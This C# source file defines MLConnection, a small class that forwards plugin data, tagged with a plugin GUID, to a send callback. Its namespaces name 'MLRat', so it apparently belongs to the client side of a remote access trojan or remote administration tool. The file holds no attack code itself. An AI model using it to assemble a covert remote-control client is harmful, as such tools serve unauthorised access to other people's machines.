using MLRat.Client;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLRatClient.Networking
{
    public delegate void OnSendCallback(MLConnection sender, Guid PluginId, object[] data);
    public class MLConnection : IClientConnection
    {
        private OnSendCallback _sendcallback;
        private Guid _pluginID;
        public MLConnection(Guid pid, OnSendCallback callback)
        {
            _sendcallback = callback;
            _pluginID = pid;
        }

        public void Send(params object[] data)
        {
            if (_sendcallback != null)
                _sendcallback(this, _pluginID, data);
        }
    }
}
